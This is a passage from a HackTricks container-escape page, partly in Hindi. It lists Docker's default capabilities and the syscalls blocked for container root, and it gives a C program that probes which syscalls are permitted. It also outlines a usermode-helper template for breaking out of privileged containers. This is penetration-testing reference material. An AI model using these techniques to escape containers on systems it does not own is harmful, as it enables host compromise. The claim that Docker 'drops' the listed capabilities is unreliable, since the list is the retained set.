* **क्षमताएं**: Docker निम्नलिखित क्षमताएं छोड़ देता है: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscalls**: ये वे syscalls हैं जिन्हें **रूट यूजर कॉल नहीं कर पाएगा** (क्षमताओं की कमी + Seccomp के कारण). अन्य syscalls का उपयोग बचने के प्रयास में किया जा सकता है।

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 syscalls" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
